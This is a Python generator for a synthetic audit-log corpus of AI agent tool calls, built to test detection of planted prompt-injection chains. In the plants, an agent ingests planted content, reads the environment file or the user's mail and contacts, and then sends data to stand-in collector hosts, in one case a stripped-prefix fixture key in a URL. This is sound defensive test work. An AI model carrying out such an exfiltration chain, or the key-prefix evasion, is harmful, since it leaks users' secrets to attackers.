"""T8c corpus: OCSF 1.9.0 api_activity (6003) + ai_operation profile, flattened, with CS0066/CS0067-shaped plants.

Deterministic given the seed. Columns are OCSF attribute paths with '.' -> '_', validated against the 1.9.0 class and
object JSON R1 fetched (read-only). Harness-only columns (not OCSF): time_epoch, is_planted, truth_chain, truth_leg.
All content is synthetic test fixture: reserved hostnames (.invalid/.example), fixture credential strings, no real data.

  .venv/bin/python -I gen_corpus.py <seed> <outdir> [n_sessions]
"""
import json, os, random, sqlite3, sys

HERE = os.path.dirname(os.path.abspath(__file__))
SCHEMA = os.path.join(HERE, "..", "atlas-ocsf-observables", "sources", "ocsf-1.9.0")
BASE = 1_793_404_800  # 2026-11-01T00:00:00Z
SPAN = 7 * 86400
N_SESSIONS_DEFAULT = 2000

ALLOWLIST = ["docs.python.org", "github.com", "api.github.com", "pypi.org", "intranet.example", "wiki.example",
             "calendar.example", "mail.example", "registry.example"]
FIXTURE_MARKER = "SDW-TEST-FIXTURE: planted indirect-instruction content (benign marker, no payload)"
# CS0067 shape: the real key form is sk-ant-api03-<95 chars>; the demonstrated evasion removed `sk-ant-`.
# This is a fixture string, not a credential, and the real prefix never appears in this corpus.
FIXTURE_DEPREFIXED = "api03-" + "TESTFIXTURE0" * 3 + "0000"
SENSITIVE_PATHS = ["/proc/self/environ", "/app/.env", "/home/ci/.env", "/srv/app/credentials.json"]

OCSF_COLUMNS = [  # (column, OCSF path) -- every path validated by validate_columns()
    ("metadata_uid", "metadata.uid"), ("time", "time"), ("class_uid", "class_uid"), ("category_uid", "category_uid"),
    ("activity_id", "activity_id"), ("activity_name", "activity_name"), ("actor_user_name", "actor.user.name"),
    ("actor_session_uid", "actor.session.uid"), ("actor_app_name", "actor.app_name"), ("ai_agent_uid", "ai_agent.uid"),
    ("ai_agent_name", "ai_agent.name"), ("ai_agent_type_id", "ai_agent.type_id"), ("ai_model_name", "ai_model.name"),
    ("api_service_name", "api.service.name"), ("api_operation", "api.operation"), ("api_request_data", "api.request.data"),
    ("api_response_data", "api.response.data"), ("status_id", "status_id"), ("dst_endpoint_hostname", "dst_endpoint.hostname"),
    ("http_request_url_hostname", "http_request.url.hostname"), ("http_request_url_path", "http_request.url.path"),
    ("message_context_uid", "message_context.uid"), ("message_context_prompt_text", "message_context.prompt_text"),
    ("delegation_uid", "delegation.uid"), ("delegation_parent_uid", "delegation.parent_uid"),
    ("delegation_issuer_uid", "delegation.issuer_uid"),
]
HARNESS_COLUMNS = ["time_epoch", "is_planted", "truth_chain", "truth_leg"]
COLUMNS = [c for c, _ in OCSF_COLUMNS] + HARNESS_COLUMNS
INT_COLS = {"class_uid", "category_uid", "activity_id", "ai_agent_type_id", "status_id", "time_epoch", "is_planted", "truth_leg"}

# activity_id for api_activity 1.9.0: 1 Create, 2 Read, 3 Update, 4 Delete
OPS = {  # op -> (service, activity_id, activity_name)
    "mail.fetch": ("gmail", 2, "Read"), "mail.search": ("gmail", 2, "Read"), "contacts.list": ("gmail", 2, "Read"),
    "calendar.read": ("calendar", 2, "Read"), "mail.send": ("gmail", 1, "Create"), "memory.write": ("memory", 1, "Create"),
    "web.fetch": ("web", 2, "Read"), "http.open": ("web", 2, "Read"), "file.read": ("fs", 2, "Read"),
    "file.write": ("fs", 3, "Update"), "bash.exec": ("shell", 1, "Create"), "git.diff": ("git", 2, "Read"),
    "issue.read": ("github", 2, "Read"), "pr.read": ("github", 2, "Read"), "github.comment": ("github", 1, "Create"),
    "agent.delegate": ("agent", 1, "Create"),
}
PERSONAS = {  # persona -> (share, agent name, app, model)
    "inbox": (0.40, "assistant-connectors", "chat-assistant", "model-l-2026"),
    "coding": (0.35, "code-agent", "code-cli", "model-c-2026"),
    "ci": (0.25, "code-agent-ci", "ci-action", "model-c-2026"),
}
BENIGN_FILES = ["/app/main.py", "/app/utils.py", "/app/README.md", "/app/tests/test_api.py", "/app/pyproject.toml",
                "/srv/app/config.yaml", "/app/Makefile", "/app/src/handlers.py"]
BENIGN_CMDS = ["pytest -q", "make lint", "git status", "python -m build", "npm test", "ls -la", "cat /app/pyproject.toml"]


def iso(t):
    import datetime as dt
    return dt.datetime.fromtimestamp(t, dt.timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


def validate_columns():
    """Resolve every OCSF path through the 1.9.0 class and object JSON; raise on the first that does not resolve."""
    cls = json.load(open(os.path.join(SCHEMA, "classes", "api_activity.json")))
    for col, path in OCSF_COLUMNS:
        attrs = cls["attributes"]
        parts = path.split(".")
        for i, p in enumerate(parts):
            if p not in attrs:
                raise SystemExit(f"column {col}: path {path} fails at '{p}' (not an attribute)")
            if i < len(parts) - 1:
                ot = attrs[p].get("object_type")
                if not ot:
                    raise SystemExit(f"column {col}: path {path}: '{p}' is not an object")
                attrs = json.load(open(os.path.join(SCHEMA, "objects", f"{ot}.json")))["attributes"]
    return True


class Builder:
    def __init__(self, seed):
        self.rng = random.Random(seed)
        self.seed = seed
        self.rows = []
        self.n_ev = 0
        self.truth = {"legs": {"1": [], "2": [], "3": []}, "chains": {}, "session_class": {}, "session_root": {},
                      "session_persona": {}}

    def ev(self, sess, t, op, args=None, resp=None, host=None, path=None, prompt=None, deleg=None, planted=0,
           chain=None, leg=None, status=1):
        service, aid, aname = OPS[op]
        self.n_ev += 1
        uid = f"e{self.seed}-{self.n_ev:07d}"
        row = {
            "metadata_uid": uid, "time": iso(t), "time_epoch": t, "class_uid": 6003, "category_uid": 6,
            "activity_id": aid, "activity_name": aname, "actor_user_name": sess["user"], "actor_session_uid": sess["uid"],
            "actor_app_name": sess["app"], "ai_agent_uid": sess["agent_uid"], "ai_agent_name": sess["agent"],
            "ai_agent_type_id": 1, "ai_model_name": sess["model"], "api_service_name": service, "api_operation": op,
            "api_request_data": json.dumps(args or {}, sort_keys=True), "api_response_data": json.dumps(resp or {"ok": True}),
            "status_id": status, "dst_endpoint_hostname": host, "http_request_url_hostname": host,
            "http_request_url_path": path, "message_context_uid": sess["uid"], "message_context_prompt_text": prompt,
            "delegation_uid": deleg[0] if deleg else None, "delegation_parent_uid": deleg[1] if deleg else None,
            "delegation_issuer_uid": deleg[2] if deleg else None,
            "is_planted": planted, "truth_chain": chain, "truth_leg": leg,
        }
        self.rows.append(row)
        if leg:
            self.truth["legs"][str(leg)].append(uid)
        return uid

    def new_session(self, persona, user=None, parent=None, root=None):
        share, agent, app, model = PERSONAS[persona]
        n = len(self.truth["session_class"]) + 1
        uid = f"s{self.seed}-{n:06d}"
        sess = {"uid": uid, "user": user or f"user{self.rng.randrange(200):03d}", "agent": agent, "app": app,
                "model": model, "agent_uid": f"{agent}-{self.rng.randrange(1, 9)}", "persona": persona,
                "deleg": (f"d-{uid}", parent["uid"], parent["agent_uid"]) if parent else None}
        self.truth["session_root"][uid] = root or uid
        self.truth["session_persona"][uid] = persona
        return sess

    def ext_host(self):
        return self.rng.choice(["news", "blog", "forum", "paste", "mirror", "cdn", "status"]) + f"-{self.rng.randrange(1, 60)}.example"

    # ---------- benign ----------
    def benign_session(self, persona, la):
        sess = self.new_session(persona)
        self.truth["session_class"][sess["uid"]] = la
        rng = self.rng
        t = BASE + rng.randrange(SPAN)
        steps = rng.randrange(3, 13)
        d = sess["deleg"]

        def step(op, **kw):
            nonlocal t
            t += rng.randrange(5, 121)
            return self.ev(sess, t, op, deleg=d, **kw)

        if persona == "inbox":
            step("mail.fetch", args={"folder": "INBOX", "limit": 20}, prompt="benign inbox content (synthetic)")
            for _ in range(steps - 1):
                r = rng.random()
                if r < 0.35:
                    step("mail.search", args={"q": rng.choice(["from:finance", "subject:invoice", "is:unread", "newer_than:7d"])})
                elif r < 0.45:
                    step("contacts.list", args={"limit": 50})
                elif r < 0.65:
                    step("calendar.read", args={"range": "week"})
                elif r < 0.80:
                    step("mail.send", args={"to": f"user{rng.randrange(200):03d}@mail.example", "subject": "re: summary"})
                else:
                    h = rng.choice(["wiki.example", "intranet.example", "calendar.example"])
                    step("web.fetch", args={"url": f"https://{h}/page/{rng.randrange(1000)}"}, host=h, path=f"/page/{rng.randrange(1000)}")
        elif persona == "coding":
            for _ in range(steps):
                r = rng.random()
                if r < 0.35:
                    p = rng.choice(SENSITIVE_PATHS[1:]) if (la == "LA6") and rng.random() < 0.5 else rng.choice(BENIGN_FILES)
                    step("file.read", args={"path": p})
                elif r < 0.55:
                    step("file.write", args={"path": rng.choice(BENIGN_FILES), "bytes": rng.randrange(100, 5000)})
                elif r < 0.75:
                    step("bash.exec", args={"cmd": rng.choice(BENIGN_CMDS)})
                elif r < 0.85:
                    step("git.diff", args={"ref": "HEAD~1"})
                else:
                    h = rng.choice(["docs.python.org", "pypi.org", "github.com"])
                    step("web.fetch", args={"url": f"https://{h}/x/{rng.randrange(1000)}"}, host=h, path=f"/x/{rng.randrange(1000)}")
            if la == "LA6":  # guarantee at least one sensitive-path read
                step("file.read", args={"path": rng.choice(SENSITIVE_PATHS[1:])})
        else:  # ci
            op = rng.choice(["issue.read", "pr.read"])
            step(op, args={"repo": "org/app", "number": rng.randrange(1, 5000)}, prompt="benign issue text (synthetic)")
            for _ in range(steps - 1):
                r = rng.random()
                if r < 0.35:
                    step("file.read", args={"path": rng.choice(BENIGN_FILES)})
                elif r < 0.60:
                    step("bash.exec", args={"cmd": rng.choice(BENIGN_CMDS)})
                elif r < 0.80:
                    step("github.comment", args={"repo": "org/app", "body_len": rng.randrange(50, 800)})
                else:
                    h = rng.choice(["api.github.com", "docs.python.org", "github.com"])
                    step("web.fetch", args={"url": f"https://{h}/x/{rng.randrange(1000)}"}, host=h, path=f"/x/{rng.randrange(1000)}")

        # explicit lookalikes
        if la == "LA1":  # ingest + sensitive read, no outbound
            if persona == "inbox":
                step("mail.search", args={"q": "label:important"}); step("contacts.list", args={"limit": 100})
            else:
                if persona == "coding":
                    step("issue.read", args={"repo": "org/app", "number": rng.randrange(1, 5000)}, prompt="benign issue text (synthetic)")
                step("file.read", args={"path": rng.choice(SENSITIVE_PATHS[1:])})
        elif la == "LA2":  # ingest + off-allowlist outbound
            if persona == "coding":
                step("issue.read", args={"repo": "org/app", "number": rng.randrange(1, 5000)}, prompt="benign issue text (synthetic)")
            h = self.ext_host()
            step("web.fetch", args={"url": f"https://{h}/article/{rng.randrange(1000)}"}, host=h, path=f"/article/{rng.randrange(1000)}")
        elif la == "LA3":  # sensitive read + off-allowlist outbound (coding shape), order varies
            h = self.ext_host()
            a = lambda: step("file.read", args={"path": rng.choice(SENSITIVE_PATHS[1:])})
            b = lambda: step("web.fetch", args={"url": f"https://{h}/pkg/{rng.randrange(1000)}.tar.gz"}, host=h, path="/pkg")
            if rng.random() < 0.5:
                a(); b()
            else:
                b(); a()
        elif la == "LA4":  # benign burst to one allowlisted host
            h = rng.choice(["docs.python.org", "wiki.example"])
            t0 = t
            for i in range(rng.randrange(20, 41)):
                t0 += rng.randrange(2, 8)
                self.ev(sess, t0, "web.fetch", args={"url": f"https://{h}/doc/{i}"}, host=h, path=f"/doc/{i}", deleg=d)
            t = t0
        elif la == "LA5":  # all three legs, benign (ci shape)
            if persona != "ci":
                step(rng.choice(["issue.read", "pr.read"]), args={"repo": "org/app", "number": rng.randrange(1, 5000)}, prompt="benign issue text (synthetic)")
            step("file.read", args={"path": rng.choice(SENSITIVE_PATHS[1:])})
            h = self.ext_host()
            step("web.fetch", args={"url": f"https://{h}/q/{rng.randrange(1000)}"}, host=h, path=f"/q/{rng.randrange(1000)}")
        elif la == "LA7":  # benign delegation, depth 1
            step("agent.delegate", args={"task": "summarize"})
            sub = self.new_session(persona, user=sess["user"], parent=sess, root=sess["uid"])
            self.truth["session_class"][sub["uid"]] = "LA7-sub"
            for _ in range(rng.randrange(2, 5)):
                t += rng.randrange(5, 61)
                if persona == "inbox":
                    self.ev(sub, t, "calendar.read", args={"range": "day"}, deleg=sub["deleg"])
                else:
                    self.ev(sub, t, "file.read", args={"path": rng.choice(BENIGN_FILES)}, deleg=sub["deleg"])

    # ---------- plants ----------
    def plant(self, chain, delegated, depth, idx):
        rng = self.rng
        persona = "inbox" if chain == "CS0066" else "ci"
        root = self.new_session(persona)
        cid = f"{chain}-{'deleg' if delegated else 'direct'}-{idx}"
        self.truth["session_class"][root["uid"]] = f"PLANT-{cid}"
        self.truth["chains"][cid] = {"root": root["uid"], "chain": chain, "delegated": delegated, "depth": depth,
                                     "sessions": [root["uid"]]}
        t = BASE + rng.randrange(SPAN)

        def step(sess, op, **kw):
            nonlocal t
            t += rng.randrange(5, 61)
            return self.ev(sess, t, op, deleg=sess["deleg"], planted=1, chain=cid, **kw)

        # leg 1: ingest external content (T0093 -> T0051.001)
        if chain == "CS0066":
            step(root, "mail.fetch", args={"folder": "INBOX", "limit": 20}, prompt=FIXTURE_MARKER, leg=1)
            step(root, "memory.write", args={"note": "SDW-TEST-FIXTURE memory entry"})  # T0080.000, not truth
        else:
            step(root, rng.choice(["issue.read", "pr.read"]), args={"repo": "org/app", "number": rng.randrange(1, 5000)},
                 prompt=FIXTURE_MARKER, leg=1)
        actor = root
        if delegated:
            prev = root
            for _ in range(depth):
                step(prev, "agent.delegate", args={"task": "continue"})
                sub = self.new_session(persona, user=root["user"], parent=prev, root=root["uid"])
                self.truth["session_class"][sub["uid"]] = f"PLANT-{cid}-sub"
                self.truth["chains"][cid]["sessions"].append(sub["uid"])
                prev = sub
            actor = prev
        # leg 2: sensitive read (T0053 + T0085.001 / T0098)
        if chain == "CS0066":
            step(actor, "mail.search", args={"q": "in:anywhere"}, leg=2)
            step(actor, "contacts.list", args={"limit": 500}, leg=2)
        else:
            step(actor, "file.read", args={"path": "/proc/self/environ"}, leg=2,
                 resp={"content_len": 4096, "note": "fixture environment, no real values"})
        # leg 3: outbound (T0054 + T0086 / T0085.002 + T0086)
        if chain == "CS0066":
            h = f"collector-{idx}-{self.seed}.invalid"
            t0 = t
            for pos in range(24):
                t0 += rng.randrange(3, 9)
                self.ev(actor, t0, "http.open", args={"url": f"https://{h}/c/{rng.randrange(64)}/{pos}"}, host=h,
                        path=f"/c/{rng.randrange(64)}/{pos}", deleg=actor["deleg"], planted=1, chain=cid, leg=3)
            t = t0
            for _ in range(3):  # T0143 propagation, not truth
                step(actor, "mail.send", args={"to": f"user{rng.randrange(200):03d}@mail.example", "subject": "fwd"})
        else:
            h = f"collector-{idx}-{self.seed}.invalid"
            step(actor, "web.fetch", args={"url": f"https://{h}/r?v={FIXTURE_DEPREFIXED}"}, host=h, path="/r", leg=3)
            step(actor, "bash.exec", args={"cmd": f"echo {FIXTURE_DEPREFIXED}"})  # Action-log channel, not truth


def gen(seed, n_sessions=N_SESSIONS_DEFAULT):
    validate_columns()
    b = Builder(seed)
    rng = b.rng
    la_cum = [("LA1", 0.04), ("LA2", 0.04), ("LA3", 0.03), ("LA4", 0.02), ("LA5", 0.005), ("LA7", 0.03)]
    for _ in range(n_sessions):
        r = rng.random()
        persona = "inbox" if r < 0.40 else ("coding" if r < 0.75 else "ci")
        la, acc, x = "none", 0.0, rng.random()
        for name, rate in la_cum:
            acc += rate
            if x < acc:
                la = name
                break
        if la == "LA3" and persona != "coding":
            persona = "coding"
        if la == "none" and persona == "coding" and rng.random() < 0.03:
            la = "LA6"
        b.benign_session(persona, la)
    for chain in ("CS0066", "CS0067"):
        for i in range(5):
            b.plant(chain, False, 0, i)
        for i in range(5):
            b.plant(chain, True, 1 if i < 3 else 2, i)
    b.rows.sort(key=lambda r: (r["time_epoch"], r["metadata_uid"]))
    return b.rows, b.truth


def write(rows, truth, outdir):
    os.makedirs(outdir, exist_ok=True)
    db = os.path.join(outdir, "corpus.sqlite")
    if os.path.exists(db):
        os.remove(db)
    con = sqlite3.connect(db)
    cols = ", ".join(f"{c} {'INTEGER' if c in INT_COLS else 'TEXT'}" for c in COLUMNS)
    con.execute(f"CREATE TABLE api ({cols})")
    con.executemany(f"INSERT INTO api VALUES ({', '.join('?' * len(COLUMNS))})", [tuple(r[c] for c in COLUMNS) for r in rows])
    con.commit()
    con.close()
    json.dump(truth, open(os.path.join(outdir, "truth.json"), "w"), indent=1, sort_keys=True)
    return db


if __name__ == "__main__":
    seed, out = int(sys.argv[1]), sys.argv[2]
    n = int(sys.argv[3]) if len(sys.argv) > 3 else N_SESSIONS_DEFAULT
    rows, truth = gen(seed, n)
    write(rows, truth, out)
    print(f"seed {seed}: {len(rows)} events, {len(truth['session_class'])} sessions, chains {len(truth['chains'])}")
